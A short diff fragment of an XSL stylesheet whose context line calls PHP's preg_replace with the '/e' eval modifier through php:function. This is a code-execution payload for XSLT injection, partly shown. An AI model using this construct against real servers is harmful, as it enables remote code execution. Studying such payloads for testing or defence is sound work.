@@ -6,4 +6,3 @@
                   <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
           </xsl:template>
 </xsl:stylesheet>
-
